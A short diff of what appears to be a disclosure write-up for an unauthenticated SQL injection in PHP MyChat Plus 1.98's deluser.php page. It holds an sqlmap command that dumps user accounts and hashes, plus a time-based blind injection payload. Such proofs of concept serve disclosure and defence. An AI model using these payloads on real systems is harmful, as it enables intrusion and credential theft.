@@ -1,4 +1,4 @@
-The PHP MyChat Plus application is vulnerable to SQL Injection without authentication through the "deluser.php" page.
+The PHP MyChat Plus 1.98 application is vulnerable to SQL Injection without authentication through the "deluser.php" page.
 
 Capture the request through burpsuite:
 
@@ -38,6 +38,8 @@ sqlmap -r deleteuserlogin.req --level=5 --risk=3 --dbms=mysql --tamper=unmagicqu
 
 This will dump all the users and the very weak hashes.
 
+````
+
 POC URLS for the injection:
 ---
 Parameter: pmc_username (POST)
@@ -53,3 +55,4 @@ Parameter: pmc_username (POST)
     Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
     Payload: L=english&Link=&LIMIT=0&pmc_username=test' AND (SELECT 5588 FROM (SELECT(SLEEP(5)))wWnk)-- FHPh&pmc_password=test&login_form=Log In
 ---
+````
